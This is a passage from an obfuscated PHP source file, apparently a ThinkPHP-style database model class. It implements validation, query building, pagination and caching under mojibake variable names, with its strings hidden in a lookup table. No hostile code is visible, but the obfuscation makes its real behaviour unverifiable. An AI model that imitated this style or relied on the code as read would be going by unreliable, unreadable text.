$â›ŠÆñ[1]), $Óš¢Åé); } break; case $‘ÁêÅ[351]: $¸ÊŞü“¹[$â›ŠÆñ[0]] = $¸ÊŞü“¹[$â›ŠÆñ[1]]; break; case $‘ÁêÅ[398]: if ($‘ÁêÅ[12] === $¸ÊŞü“¹[$â›ŠÆñ[0]]) { unset($¸ÊŞü“¹[$â›ŠÆñ[0]]); } break; case $‘ÁêÅ[399]: default: $¸ÊŞü“¹[$â›ŠÆñ[0]] = $â›ŠÆñ[1]; } if (!1 === $¸ÊŞü“¹[$â›ŠÆñ[0]]) { unset($¸ÊŞü“¹[$â›ŠÆñ[0]]); } } } } return $¸ÊŞü“¹; } protected function autoValidation($Îıø†×õ, $¿½•”­Æ) { $÷™•âšŠ =& $_SERVER[œ—üé‹ê]; if (!empty($this->options[$÷™•âšŠ[400]])) { $ƒî“˜ = $this->options[$÷™•âšŠ[400]]; unset($this->options[$÷™•âšŠ[400]]); } elseif (!empty($this->_validate)) { $ƒî“˜ = $this->_validate; } if (isset($ƒî“˜)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ƒî“˜ as $­›–€‡¿ => $Ãâğ°»±) { if (empty($Ãâğ°»±[5]) || $Ãâğ°»±[5] == THINK_MODEL_BOTH || $Ãâğ°»±[5] == $¿½•”­Æ) { if (0 == strpos($Ãâğ°»±[2], $÷™•âšŠ[401]) && strpos($Ãâğ°»±[2], $÷™•âšŠ[402])) { $Ãâğ°»±[2] = think_lang(substr($Ãâğ°»±[2], 2, -1)); } $Ãâğ°»±[3] = isset($Ãâğ°»±[3]) ? $Ãâğ°»±[3] : THINK_EXISTS_VALIDATE; $Ãâğ°»±[4] = isset($Ãâğ°»±[4]) ? $Ãâğ°»±[4] : $÷™•âšŠ[403]; switch ($Ãâğ°»±[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Îıø†×õ, $Ãâğ°»±)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($÷™•âšŠ[12] != trim($Îıø†×õ[$Ãâğ°»±[0]])) { if (!1 === $this->_validationField($Îıø†×õ, $Ãâğ°»±)) { return !1; } } break; default: if (isset($Îıø†×õ[$Ãâğ°»±[0]])) { if (!1 === $this->_validationField($Îıø†×õ, $Ãâğ°»±)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¿áŒàÇà, $í÷¿ã°ú) { if (!1 === $this->_validationFieldItem($¿áŒàÇà, $í÷¿ã°ú)) { if ($this->patchValidate) { $this->error[$í÷¿ã°ú[0]] = $í÷¿ã°ú[2]; } else { $this->error = $í÷¿ã°ú[2]; return !1; } } return; } protected function _validationFieldItem($ü€¹ÀËı, $±«ã€Š) { $ĞŠ°ö¶î =& $_SERVER[œ—üé‹ê]; switch (strtolower(trim($±«ã€Š[4]))) { case $ĞŠ°ö¶î[396]: case $ĞŠ°ö¶î[397]: $ÖÌ´ˆéï = isset($±«ã€Š[6]) ? (array) $±«ã€Š[6] : array(); if (is_string($±«ã€Š[0]) && strpos($±«ã€Š[0], $ĞŠ°ö¶î[50])) { $±«ã€Š[0] = explode($ĞŠ°ö¶î[50], $±«ã€Š[0]); } if (is_array($±«ã€Š[0])) { foreach ($±«ã€Š[0] as $ÎäÇ¾ï”) { $¾¨î£‰[$ÎäÇ¾ï”] = $ü€¹ÀËı[$ÎäÇ¾ï”]; } array_unshift($ÖÌ´ˆéï, $¾¨î£‰); } else { array_unshift($ÖÌ´ˆéï, $ü€¹ÀËı[$±«ã€Š[0]]); } if ($ĞŠ°ö¶î[396] == $±«ã€Š[4]) { return call_user_func_array($±«ã€Š[1], $ÖÌ´ˆéï); } else { return call_user_func_array(array(&$this, $±«ã€Š[1]), $ÖÌ´ˆéï); } case $ĞŠ°ö¶î[404]: return $ü€¹ÀËı[$±«ã€Š[0]] == $ü€¹ÀËı[$±«ã€Š[1]]; case $ĞŠ°ö¶î[405]: if (is_string($±«ã€Š[0]) && strpos($±«ã€Š[0], $ĞŠ°ö¶î[50])) { $±«ã€Š[0] = explode($ĞŠ°ö¶î[50], $±«ã€Š[0]); } $ë®¼®× = array(); if (is_array($±«ã€Š[0])) { foreach ($±«ã€Š[0] as $ÎäÇ¾ï”) { $ë®¼®×[$ÎäÇ¾ï”] = $ü€¹ÀËı[$ÎäÇ¾ï”]; } } else { $ë®¼®×[$±«ã€Š[0]] = $ü€¹ÀËı[$±«ã€Š[0]]; } if (!empty($ü€¹ÀËı[$this->getPk()])) { $ë®¼®×[$this->getPk()] = array($ĞŠ°ö¶î[406], $ü€¹ÀËı[$this->getPk()]); } if ($this->where($ë®¼®×)->find()) { return !1; } return !0; default: return $this->check($ü€¹ÀËı[$±«ã€Š[0]], $±«ã€Š[1], $±«ã€Š[4]); } } public function check($³É­€ââ, $¥ãË®”¿, $å¶êƒ¡† = "\x72\x65\147\145\170") { $ÀÓÖ¤Š =& $_SERVER[œ—üé‹ê]; $å¶êƒ¡† = strtolower(trim($å¶êƒ¡†)); switch ($å¶êƒ¡†) { case $ÀÓÖ¤Š[7]: case $ÀÓÖ¤Š[407]: $¥¢¼™—Ÿ = is_array($¥ãË®”¿) ? $¥ãË®”¿ : explode($ÀÓÖ¤Š[50], $¥ãË®”¿); return $å¶êƒ¡† == $ÀÓÖ¤Š[7] ? in_array($³É­€ââ, $¥¢¼™—Ÿ) : !in_array($³É­€ââ, $¥¢¼™—Ÿ); case $ÀÓÖ¤Š[408]: case $ÀÓÖ¤Š[409]: if (is_array($¥ãË®”¿)) { $ü»©„à° = $¥ãË®”¿[0]; $âß£ÀÊ› = $¥ãË®”¿[1]; } else { list($ü»©„à°, $âß£ÀÊ›) = explode($ÀÓÖ¤Š[50], $¥ãË®”¿); } return $å¶êƒ¡† == $ÀÓÖ¤Š[408] ? $³É­€ââ >= $ü»©„à° && $³É­€ââ <= $âß£ÀÊ› : $³É­€ââ < $ü»©„à° || $³É­€ââ > $âß£ÀÊ›; case $ÀÓÖ¤Š[410]: case $ÀÓÖ¤Š[411]: return $å¶êƒ¡† == $ÀÓÖ¤Š[410] ? $³É­€ââ == $¥ãË®”¿ : $³É­€ââ != $¥ãË®”¿; case $ÀÓÖ¤Š[412]: $À“Ÿ¥¹¡ = mb_strlen($³É­€ââ, $ÀÓÖ¤Š[413]); if (strpos($¥ãË®”¿, $ÀÓÖ¤Š[50])) { list($ü»©„à°, $âß£ÀÊ›) = explode($ÀÓÖ¤Š[50], $¥ãË®”¿); return $À“Ÿ¥¹¡ >= $ü»©„à° && $À“Ÿ¥¹¡ <= $âß£ÀÊ›; } else { return $À“Ÿ¥¹¡ == $¥ãË®”¿; } case $ÀÓÖ¤Š[414]: list($¢·³©ï„, $ÑŒŠÄğÚ) = explode($ÀÓÖ¤Š[50], $¥ãË®”¿); if (!is_numeric($¢·³©ï„)) { $¢·³©ï„ = strtotime($¢·³©ï„); } if (!is_numeric($ÑŒŠÄğÚ)) { $ÑŒŠÄğÚ = strtotime($ÑŒŠÄğÚ); } return NOW_TIME >= $¢·³©ï„ && NOW_TIME <= $ÑŒŠÄğÚ; case $ÀÓÖ¤Š[415]: return in_array(get_client_ip(), explode($ÀÓÖ¤Š[50], $¥ãË®”¿)); case $ÀÓÖ¤Š[416]: return !in_array(get_client_ip(), explode($ÀÓÖ¤Š[50], $¥ãË®”¿)); case $ÀÓÖ¤Š[403]: default: return $this->regex($³É­€ââ, $¥ãË®”¿); } } public function query($áÁ¿º³É, $µ”„¦—» = false) { $ë“Å®ßà =& $_SERVER[œ—üé‹ê]; if (!is_bool($µ”„¦—») && !is_array($µ”„¦—»)) { $µ”„¦—» = func_get_args(); array_shift($µ”„¦—»); } $áÁ¿º³É = str_replace(array($ë“Å®ßà[285], $ë“Å®ßà[417]), $ë“Å®ßà[53], $áÁ¿º³É); $áÁ¿º³É = $this->parseSql($áÁ¿º³É, $µ”„¦—»); return $this->db->query($áÁ¿º³É); } public function execute($»òĞè¤È, $©•¤ü£ = false) { if (!is_bool($©•¤ü£) && !is_array($©•¤ü£)) { $©•¤ü£ = func_get_args(); array_shift($©•¤ü£); } $»òĞè¤È = $this->parseSql($»òĞè¤È, $©•¤ü£); return $this->db->execute($»òĞè¤È); } protected function parseSql($çôéÂƒØ, $ì³™Ìµ) { $¢Î€Úæ =& $_SERVER[œ—üé‹ê]; if (!0 === $ì³™Ìµ) { $™„Ö‚Æì = $this->_parseOptions(); $çôéÂƒØ = $this->db->parseSql($çôéÂƒØ, $™„Ö‚Æì); } elseif (is_array($ì³™Ìµ)) { $ì³™Ìµ = array_map(array($this->db, $¢Î€Úæ[418]), $ì³™Ìµ); $çôéÂƒØ = vsprintf($çôéÂƒØ, $ì³™Ìµ); } else { $çôéÂƒØ = strtr($çôéÂƒØ, array($¢Î€Úæ[419] => $this->getTableName(), $¢Î€Úæ[420] => think_config($¢Î€Úæ[321]))); } $this->db->setModel($this->name); return $çôéÂƒØ; } public function db($š²¶úÊ = '', $ˆßÀˆ÷ = '', $Û¸€ğµ¯ = array()) { $³‰›…¬ =& $_SERVER[œ—üé‹ê]; if ($³‰›…¬[12] === $š²¶úÊ && $this->db) { return $this->db; } static $öØ¿¸™ = array(); static $šÏµ‹ = array(); if (!isset($šÏµ‹[$š²¶úÊ]) || isset($šÏµ‹[$š²¶úÊ]) && $ˆßÀˆ÷ && $öØ¿¸™[$š²¶úÊ] != $ˆßÀˆ÷) { if (!empty($ˆßÀˆ÷) && is_string($ˆßÀˆ÷) && !1 === strpos($ˆßÀˆ÷, $³‰›…¬[8])) { $ˆßÀˆ÷ = think_config($ˆßÀˆ÷); } $š²¶úÊ = think_guid($ˆßÀˆ÷); $šÏµ‹[$š²¶úÊ] = Db::getInstance($ˆßÀˆ÷); } elseif (NULL === $ˆßÀˆ÷) { $šÏµ‹[$š²¶úÊ]->close(); unset($šÏµ‹[$š²¶úÊ]); return; } if (!empty($Û¸€ğµ¯)) { if (is_string($Û¸€ğµ¯)) { parse_str($Û¸€ğµ¯, $Û¸€ğµ¯); } foreach ($Û¸€ğµ¯ as $íà¼î« => $“ß²àü×) { $this->setProperty($íà¼î«, $“ß²àü×); } } $öØ¿¸™[$š²¶úÊ] = $ˆßÀˆ÷; $this->db = $šÏµ‹[$š²¶úÊ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¥›ùÓï¨ = get_class($this); if ($¥›ùÓï¨ == $_SERVER[œ—üé‹ê][421]) { return $this->name; } $this->name = substr($¥›ùÓï¨, 0, -5); } return $this->name; } public function getTableName() { $üÏäóñ =& $_SERVER[œ—üé‹ê]; if (empty($this->trueTableName)) { $Ëò÷÷Ê = !empty($this->tablePrefix) ? $this->tablePrefix : $üÏäóñ[12]; if (!empty($this->tableName)) { $Ëò÷÷Ê .= $this->tableName; } else { $Ëò÷÷Ê .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ëò÷÷Ê); } return (!empty($this->dbName) ? $this->dbName . $üÏäóñ[10] : $üÏäóñ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $›××ïıˆ =& $_SERVER[œ—üé‹ê]; return isset($this->fields[$›××ïıˆ[328]]) ? $this->fields[$›××ïıˆ[328]] : $this->pk; } public function getDbFields() { $åÚ›ÙÒ =& $_SERVER[œ—üé‹ê]; if (isset($this->options[$åÚ›ÙÒ[357]])) { $î¹«¨ = $this->db->getFields($this->options[$åÚ›ÙÒ[357]]); return $î¹«¨ ? array_keys($î¹«¨) : !1; } if ($this->fields) { $î¹«¨ = $this->fields; unset($î¹«¨[$åÚ›ÙÒ[327]], $î¹«¨[$åÚ›ÙÒ[328]], $î¹«¨[$åÚ›ÙÒ[329]], $î¹«¨[$åÚ›ÙÒ[326]]); return $î¹«¨; } return !1; } public function data($Š»ˆ = '') { $Âö·ˆï˜ =& $_SERVER[œ—üé‹ê]; if ($Âö·ˆï˜[12] === $Š»ˆ && !empty($this->data)) { return $this->data; } if (is_object($Š»ˆ)) { $Š»ˆ = get_object_vars($Š»ˆ); } elseif (is_string($Š»ˆ)) { parse_str($Š»ˆ, $Š»ˆ); } elseif (!is_array($Š»ˆ)) { think_exception(think_lang($Âö·ˆï˜[349])); } $this->data = $Š»ˆ; return $this; } public function join($ù„øÆœ) { $£ìè—À =& $_SERVER[œ—üé‹ê]; if (is_array($ù„øÆœ)) { $this->options[$£ìè—À[360]] = $ù„øÆœ; } elseif (!empty($ù„øÆœ)) { $this->options[$£ìè—À[360]][] = $ù„øÆœ; } return $this; } public function union($Ğ€õ¾·‚, $Ã˜Òı•î = false) { $âº£ÇËœ =& $_SERVER[œ—üé‹ê]; if (empty($Ğ€õ¾·‚)) { return $this; } if ($Ã˜Òı•î) { $this->options[$âº£ÇËœ[422]][$âº£ÇËœ[423]] = !0; } if (is_object($Ğ€õ¾·‚)) { $Ğ€õ¾·‚ = get_object_vars($Ğ€õ¾·‚); } if (is_string($Ğ€õ¾·‚)) { $ËÁîıõö = $Ğ€õ¾·‚; } elseif (is_array($Ğ€õ¾·‚)) { if (isset($Ğ€õ¾·‚[0])) { $this->options[$âº£ÇËœ[422]] = array_merge($this->options[$âº£ÇËœ[422]], $Ğ€õ¾·‚); return $this; } else { $ËÁîıõö = $Ğ€õ¾·‚; } } else { think_exception(think_lang($âº£ÇËœ[349])); } $this->options[$âº£ÇËœ[422]][] = $ËÁîıõö; return $this; } public function cache($šı¨°« = true, $ôë•Íåí = null, $É¸›â‰ş = '') { $‰ŒâŠù… =& $_SERVER[œ—üé‹ê]; if (!1 !== $šı¨°«) { $this->options[$‰ŒâŠù…[424]] = array($‰ŒâŠù…[95] => $šı¨°«, $‰ŒâŠù…[414] => $ôë•Íåí, $‰ŒâŠù…[33] => $É¸›â‰ş); } return $this; } public function field($¿·÷“Íô, $‚¾ŠÎï§ = false) { $œ‹ÈÇìŠ =& $_SERVER[œ—üé‹ê]; if (!0 === $¿·÷“Íô) { $¤ÄªÔæË = $this->getDbFields(); $¿·÷“Íô = $¤ÄªÔæË ? $¤ÄªÔæË : $œ‹ÈÇìŠ[220]; } elseif ($‚¾ŠÎï§) { if (is_string($¿·÷“Íô)) { $¿·÷“Íô = explode($œ‹ÈÇìŠ[50], $¿·÷“Íô); } $¤ÄªÔæË = $this->getDbFields(); $¿·÷“Íô = $¤ÄªÔæË ? array_diff($¤ÄªÔæË, $¿·÷“Íô) : $¿·÷“Íô; } $this->options[$œ‹ÈÇìŠ[351]] = $¿·÷“Íô; return $this; } public function scope($îşè¶œ = '', $ÀÜ‡ï’¾ = NULL) { $œÜüÊóù =& $_SERVER[œ—üé‹ê]; if ($œÜüÊóù[12] === $îşè¶œ) { if (isset($this->_scope[$œÜüÊóù[37]])) { $¨ÚïÈç‰ = $this->_scope[$œÜüÊóù[37]]; } else { return $this; } } elseif (is_string($îşè¶œ)) { $¹êûËğÃ = explode($œÜüÊóù[50], $îşè¶œ); $¨ÚïÈç‰ = array(); foreach ($¹êûËğÃ as $éÜ¬ÌÂú) { if (!isset($this->_scope[$éÜ¬ÌÂú])) { continue; } $¨ÚïÈç‰ = array_merge($¨ÚïÈç‰, $this->_scope[$éÜ¬ÌÂú]); } if (!empty($ÀÜ‡ï’¾) && is_array($ÀÜ‡ï’¾)) { $¨ÚïÈç‰ = array_merge($¨ÚïÈç‰, $ÀÜ‡ï’¾); } } elseif (is_array($îşè¶œ)) { $¨ÚïÈç‰ = $îşè¶œ; } if (is_array($¨ÚïÈç‰) && !empty($¨ÚïÈç‰)) { $this->options = array_merge($this->options, array_change_key_case($¨ÚïÈç‰)); } return $this; } public function where($çØç¢º, $¥øêÂ½à = null) { $Í´Ú©„Ä =& $_SERVER[œ—üé‹ê]; if (!is_null($¥øêÂ½à) && is_string($çØç¢º)) { if (!is_array($¥øêÂ½à)) { $¥øêÂ½à = func_get_args(); array_shift($¥øêÂ½à); } $¥øêÂ½à = array_map(array($this->db, $Í´Ú©„Ä[418]), $¥øêÂ½à); $çØç¢º = vsprintf($çØç¢º, $¥øêÂ½à); } elseif (is_object($çØç¢º)) { $çØç¢º = get_object_vars($çØç¢º); } elseif (is_array($çØç¢º)) { foreach ($çØç¢º as $¤Õ¯®±¥ => $ÛÅÃÃ÷) { if ((is_numeric($¤Õ¯®±¥) || !$¤Õ¯®±¥) && is_string($ÛÅÃÃ÷)) { if (strpos($ÛÅÃÃ÷, $Í´Ú©„Ä[425]) === 0) { continue; } think_trace($Í´Ú©„Ä[426], $Í´Ú©„Ä[12], $Í´Ú©„Ä[49]); die; } } } if (is_string($çØç¢º) && $Í´Ú©„Ä[12] != $çØç¢º) { $ßôÃÌ¿½ = array(); $ßôÃÌ¿½[$Í´Ú©„Ä[427]] = $çØç¢º; $çØç¢º = $ßôÃÌ¿½; } if (isset($this->options[$Í´Ú©„Ä[353]])) { $this->options[$Í´Ú©„Ä[353]] = array_merge($this->options[$Í´Ú©„Ä[353]], $çØç¢º); } else { $this->options[$Í´Ú©„Ä[353]] = $çØç¢º; } return $this; } public function limit($®œœ³İã, $Ô‰‹ùğ = null) { $€×‰âØİ =& $_SERVER[œ—üé‹ê]; $this->options[$€×‰âØİ[368]] = is_null($Ô‰‹ùğ) ? $®œœ³İã : $®œœ³İã . $€×‰âØİ[50] . $Ô‰‹ùğ; return $this; } public function page($Öæ¨›åá, $ôÇ«Òªì = null) { $ÃµÂ¤‘Á =& $_SERVER[œ—üé‹ê]; $this->options[$ÃµÂ¤‘Á[428]] = is_null($ôÇ«Òªì) ? $Öæ¨›åá : $Öæ¨›åá . $ÃµÂ¤‘Á[50] . $ôÇ«Òªì; return $this; } public function comment($ö¸Šê™ğ) { $this->options[$_SERVER[œ—üé‹ê][429]] = $ö¸Šê™ğ; return $this; } public function setProperty($å×Àƒ¥ù, $³‘Á‚†·) { if (property_exists($this, $å×Àƒ¥ù)) { $this->{$å×Àƒ¥ù} = $³‘Á‚†·; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\x54\x69\155\145", "\164\x69\155\x65", "\x69\x6e\163\145\x72\x74\x2c\165\160\144\141\164\145", "\x66\165\156\x63\x74\x69\157\156"), array("\143\x72\x65\x61\164\x65\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\163\x65\162\x74", "\146\x75\156\143\x74\151\x6f\156")); public function setDataAuto($“Îã¸ŠÌ) { $this->dataAuto = $“Îã¸ŠÌ; } public function __construct($ÏÏÈ‘¥ä = '', $ÂƒÓïÉÕ = '', $«µ§Ó = '') { parent::__construct($ÏÏÈ‘¥ä, $ÂƒÓïÉÕ, $«µ§Ó); } protected $tableMeta = array(); protected function _beforeInsert(&$Ûµòª—ã, $äµü‰ã¸) { $Ÿ„íÕ–­ =& $_SERVER[œ—üé‹ê]; if (!$this->checkDataAutoHas($Ÿ„íÕ–­[430])) { return; } $this->dataBeforeFilter($Ûµòª—ã, $Ÿ„íÕ–­[430]); } protected function _beforeUpdate(&$ŸõíÍêı, $í—ÅŠ²) { $ĞŸĞßªÍ =& $_SERVER[œ—üé‹ê]; if (!$this->checkDataAutoHas($ĞŸĞßªÍ[431])) { return; } $this->dataBeforeFilter($ŸõíÍêı, $ĞŸĞßªÍ[431]); } protected function _afterSelect(&$ƒ®ğüß, $Ş÷¦òÒª) { if (!is_array($ƒ®ğüß)) { return; } if (!$this->checkDataAutoHas($_SERVER[œ—üé‹ê][432])) { return; } foreach ($ƒ®ğüß as &$…ÈÈ‡““) { $this->dataAfterFilter($…ÈÈ‡““); } unset($…ÈÈ‡““); } protected function _afterFind(&$«š‰üš³, $şƒ¿ş¤°) { if (!is_array($«š‰üš³)) { return; } if (!$this->checkDataAutoHas($_SERVER[œ—üé‹ê][432])) { return; } $this->dataAfterFilter($«š‰üš³); } public static function textEncode($ú€¾ûõŸ) { if (!$ú€¾ûõŸ) { return $ú€¾ûõŸ; } $í¯¸ã¨ = json_encode($ú€¾ûõŸ); $í¯¸ã¨ = preg_replace_callback($_SERVER[œ—üé‹ê][433], function ($®×Ğ´é—) { return addslashes($®×Ğ´é—[0]); }, $í¯¸ã¨); return json_decode($í¯¸ã¨); } public static function textDecode($’¼¡©Å¨) { $’‘İ›á =& $_SERVER[œ—üé‹ê]; if (!$’¼¡©Å¨) { return $’¼¡©Å¨; } $¾à•ÕòË = json_encode($’¼¡©Å¨); $¾à•ÕòË = preg_replace_callback($’‘İ›á[434], function ($âÃÚàĞÁ) { return $_SERVER[œ—üé‹ê][97]; }, $¾à•ÕòË); return json_decode($¾à•ÕòË); } public function setAutoIncrement($ò…‹Ø„â) { $°ÈÊù¢ = array($this->getPk() => $ò…‹Ø„â); $ğÎ«‰¬á = $this->data($°ÈÊù¢)->add(); if ($ğÎ«‰¬á) { $this->delete($ğÎ«‰¬á); } } public function getAutoIncrement() { $° ÖÏ¹‡ = $this->getTableName(); $şö´íÃ = $this->max($this->getPk()); $É—¶¹ÆÙ = $this->query("\163\x68\x6f\167\x20\164\141\x62\154\145\40\163\164\141\164\165\x73\x20\167\150\145\x72\145\40\116\141\155\145\75\47{$° ÖÏ¹‡}\x27"); $´…ŸŠÊ = $É—¶¹ÆÙ[0][$_SERVER[œ—üé‹ê][435]]; $º»ò½ıŠ = max($şö´íÃ, $´…ŸŠÊ); return $º»ò½ıŠ; } protected function _callBefore($›‰ÒÇ±æ, $õœøå¨Ó) { return $this->cacheCallCheck($›‰ÒÇ±æ, $õœøå¨Ó, !1); } protected function _callAfter($ÏôºÁ¾Ñ, $èşÂƒ¡) { return $this->cacheCallCheck($ÏôºÁ¾Ñ, $èşÂƒ¡, !0); } protected function cacheFunctionAlias($é”Á¼±) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¢øÏõ’æ, $Üéúú, $ÊÛñ–èÃ = false) { $ÀÊ¦º‹ä =& $_SERVER[œ—üé‹ê]; $ ©‰¿ôŠ = $this->cacheFunctionAlias($Üéúú); if (!$ ©‰¿ôŠ) { return; } foreach ($ ©‰¿ôŠ as $ùÂç°Œä => $ğäıÌ’Ÿ) { $¸ãÙ—‡× = $ğäıÌ’Ÿ[0]; $Î¦üò¸ = explode($ÀÊ¦º‹ä[50], $ğäıÌ’Ÿ[1]); $æ™ÉÒë = isset($ğäıÌ’Ÿ[2]) ? $ğäıÌ’Ÿ[2] : $ÀÊ¦º‹ä[12]; if ($¢øÏõ’æ == $ùÂç°Œä) { return $this->cacheFunctionGet($ùÂç°Œä, $¸ãÙ—‡×, $æ™ÉÒë); } if ($ÊÛñ–èÃ && in_array($¢øÏõ’æ, $Î¦üò¸)) { $this->cacheFunctionClear($ùÂç°Œä, $¸ãÙ—‡×, $æ™ÉÒë); } } } public function cacheFunctionGet($Õì‹å½, $‡óğ…’Û, $²Ê¹³Í = '') { $´Û®¬™Ü =& $_SERVER[œ—üé‹ê]; $Âıá†¼ñ = $this->cacheKeyMake($Õì‹å½, $‡óğ…’Û, $²Ê¹³Í); $ƒà§Áş„ = Cache::get($Âıá†¼ñ); if (!is_array($ƒà§Áş„)) { if (method_exists($this, $´Û®¬™Ü[341] . $Õì‹å½)) { $Õì‹å½ = $´Û®¬™Ü[341] . $Õì‹å½; } $ƒà§Áş„ = call_user_func_array(array($this, $Õì‹å½), array($‡óğ…’Û, !0)); Cache::set($Âıá†¼ñ, $ƒà§Áş„); } return $ƒà§Áş„; } public function cacheFunctionClear($•Úõ…Ğ, $™ŠÚí³Õ, $ß¦™õ¯Î = '') { $ÃÉùÁû” = $™ŠÚí³Õ; if (!is_array($™ŠÚí³Õ)) { $ÃÉùÁû” = array($™ŠÚí³Õ); } foreach ($ÃÉùÁû” as $‚ÚšºğÓ) { $Æ´šÎ  = $this->cacheKeyMake($•Úõ…Ğ, $‚ÚšºğÓ, $ß¦™õ¯Î); Cache::remove($Æ´šÎ ); } } public function cacheKeyMake($ÕŒõÖË­, $˜íÅÁàú, $‚§•®åù) { $¥©Òî¿ =& $_SERVER[œ—üé‹ê]; if ($‚§•®åù) { $˜íÅÁàú = $˜íÅÁàú . $¥©Òî¿[436] . $‚§•®åù; } return get_class($this) . $¥©Òî¿[11] . $ÕŒõÖË­ . $¥©Òî¿[437] . $˜íÅÁàú; } protected function selectPageReset() { $½í«Ö„º =& $_SERVER[œ—üé‹ê]; if (isset($GLOBALS[$½í«Ö„º[438]])) { return; } $GLOBALS[$½í«Ö„º[438]] = isset($GLOBALS[$½í«Ö„º[7]][$½í«Ö„º[439]]) ? $GLOBALS[$½í«Ö„º[7]][$½í«Ö„º[439]] : !1; $GLOBALS[$½í«Ö„º[440]] = isset($GLOBALS[$½í«Ö„º[7]][$½í«Ö„º[428]]) ? $GLOBALS[$½í«Ö„º[7]][$½í«Ö„º[428]] : !1; $GLOBALS[$½í«Ö„º[7]][$½í«Ö„º[439]] = !1; $GLOBALS[$½í«Ö„º[7]][$½í«Ö„º[428]] = !1; } protected function selectPageRestore() { $éÆòÚ—¡ =& $_SERVER[œ—üé‹ê]; if (!isset($GLOBALS[$éÆòÚ—¡[438]])) { return; } $GLOBALS[$éÆòÚ—¡[7]][$éÆòÚ—¡[439]] = $GLOBALS[$éÆòÚ—¡[438]]; $GLOBALS[$éÆòÚ—¡[7]][$éÆòÚ—¡[428]] = $GLOBALS[$éÆòÚ—¡[440]]; if ($GLOBALS[$éÆòÚ—¡[7]][$éÆòÚ—¡[439]] === !1) { unset($GLOBALS[$éÆòÚ—¡[7]][$éÆòÚ—¡[439]]); } if ($GLOBALS[$éÆòÚ—¡[7]][$éÆòÚ—¡[428]] === !1) { unset($GLOBALS[$éÆòÚ—¡[7]][$éÆòÚ—¡[428]]); } unset($GLOBALS[$éÆòÚ—¡[438]]); unset($GLOBALS[$éÆòÚ—¡[440]]); } protected function selectPage($ÈÒâøİÔ = 200, $–â—‹™Ô = 1) { $®Öòğ© =& $_SERVER[œ—üé‹ê]; global $in; $¹î«Ñü˜ = $this->optionsValue(); $îÁ‡¦ïĞ = 100000; $ÈÒâøİÔ = isset($in[$®Öòğ©[439]]) && $in[$®Öòğ©[439]] ? $in[$®Öòğ©[439]] : $ÈÒâøİÔ; if ($ÈÒâøİÔ === -1) { $in[$®Öòğ©[439]] = !1; $îÁ‡¦ïĞ = 100000000; $ÈÒâøİÔ = $îÁ‡¦ïĞ; } $îóŞÇ¡î = $¹î«Ñü˜; $îóŞÇ¡î[$®Öòğ©[441]] = array(); $ÈÒâøİÔ = intval($ÈÒâøİÔ); $ÈÒâøİÔ = $ÈÒâøİÔ <= 5 ? 5 : ($ÈÒâøİÔ >= $îÁ‡¦ïĞ ? $îÁ‡¦ïĞ : $ÈÒâøİÔ); $–â—‹™Ô = intval(isset($in[$®Öòğ©[428]]) && $in[$®Öòğ©[428]] ? $in[$®Öòğ©[428]] : $–â—‹™Ô); $–â—‹™Ô = $–â—‹™Ô <= 1 ? 1 : $–â—‹™Ô; $ÑœæËÒÔ = array(); $£¶Çğåü = 1; $¸¯èÑÕŞ = $this->selectPageCountBy(); if ($–â—‹™Ô == 1 && $£¶Çğåü) { $this->optionsValue($¹î«Ñü˜); $ÑœæËÒÔ = $this->page($–â—‹™Ô, $ÈÒâøİÔ)->select(); $Å•–ÊÍë = is_array($ÑœæËÒÔ) ? count($ÑœæËÒÔ) : 0; if ($Å•–ÊÍë < $ÈÒâøİÔ) { $‚Êäá«ó = 1; } else { $this->optionsValue($îóŞÇ¡î); $Å•–ÊÍë = intval($this->count($¸¯èÑÕŞ)); $‚Êäá«ó = ceil($Å•–ÊÍë / $ÈÒâøİÔ); } } else { $this->optionsValue($îóŞÇ¡î); $Å•–ÊÍë = intval($this->count($¸¯èÑÕŞ)); $‚Êäá«ó = ceil($Å•–ÊÍë / $ÈÒâøİÔ); $–â—‹™Ô = $–â—‹™Ô >= $‚Êäá«ó ? $‚Êäá«ó : $–â—‹™Ô; $this->optionsValue($¹î«Ñü˜); $ÑœæËÒÔ = $this->page($–â—‹™Ô, $ÈÒâøİÔ)->select(); } $this->selectPageCountBy($®Öòğ©[442]); if (!is_array($ÑœæËÒÔ)) { $ÑœæËÒÔ = array(); } if ($‚Êäá«ó == 1) { $Å•–ÊÍë = count($ÑœæËÒÔ); } $‰õÛÄ÷ = array($®Öòğ©[443] => array($®Öòğ©[444] => $Å•–ÊÍë, $®Öòğ©[439] => $ÈÒâøİÔ, $®Öòğ©[428] => $–â—‹™Ô, $®Öòğ©[445] => $‚Êäá«ó), $®Öòğ©[446] => $ÑœæËÒÔ); return $‰õÛÄ÷; } protected function selectPageCountBy($…ğ†â”ë = false) { static $»¾©¼Ä‡ = null; if (!$…ğ†â”ë) { return $»¾©¼Ä‡; } if ($…ğ†â”ë == $_SERVER[œ—üé‹ê][442]) { $»¾©¼Ä‡ = null; return; } $»¾©¼Ä‡ = $…ğ†â”ë; } protected function checkLength($ÜÛ·Í‡Í, $µ·Ğ‚† = 0, $•½ÈÅ•Ë = '') { $úÃÚéù =& $_SERVER[œ—üé‹ê]; $µ·Ğ‚† = $µ·Ğ‚† ? $µ·Ğ‚† : 65536; if (!$ÜÛ·Í‡Í || strlen($ÜÛ·Í‡Í) < $µ·Ğ‚†) { return; } $•½ÈÅ•Ë = $•½ÈÅ•Ë ? $•½ÈÅ•Ë . $úÃÚéù[74] : $úÃÚéù[12]; show_json($•½ÈÅ•Ë . LNG($úÃÚéù[447]) . "\x28{$µ·Ğ‚†}\x29", 